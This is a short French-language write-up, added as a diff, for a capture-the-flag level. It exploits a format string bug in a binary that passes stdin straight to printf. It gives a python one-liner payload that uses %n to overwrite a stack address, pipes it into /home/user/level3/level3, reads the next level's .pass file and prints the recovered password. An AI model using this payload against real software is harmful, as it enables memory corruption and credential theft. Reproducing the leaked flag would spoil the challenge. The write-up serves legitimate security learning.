@@ -1,0 +1,27 @@
+On a disas le main et la fontion qu'il appelle, on s'apercoit qu'il envoie notre chaine (STDIN) de caractere au printf sans
+passer par une chaine de conversion (%s). On peut donc réaliser un format string bug.
+
+L'option %n de printf va nous permettre d'écrire un nombre arbitraire (le nombre de caractère écrit jusque là), à une addresse
+arbitraire(la prochaine sur la stack).
+
+On va donc écrire 64 caracteres, puis un %n, en se debrouillant pour que le %n tombe sur l'adresse qu'on souhaite.
+
+Pour ce faire, on va devoir ecrire l'adresse dans la stack :
+Chaine à écrire : adresse.
+
+ensuite, on va écrire 3 "%02x." pour avancer jusque l'adresse qu'on vient d'écrire
+chaine à écrire : adresse + %02x.%02x.%02x.
+
+Enfin on écrit le %n :
+chaine à écrire : adresse + %02x.%02x.%02x.%n
+
+On crée tout cela avec python :
+python -c "print '\x8c''\x98''\x04''\x08' + '%02x.'*3 + 'a' * 38 + '%n'" > /tmp/b
+
+Puis on l'envoie avec cat et un pipe dans le programme via l'entree standard (stdin) :
+cat /tmp/b - | /home/user/level3/level3
+
+On n'a plus qu'à récupérer le flag :
+cat /home/user/level4/.pass
+
+On récupère : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
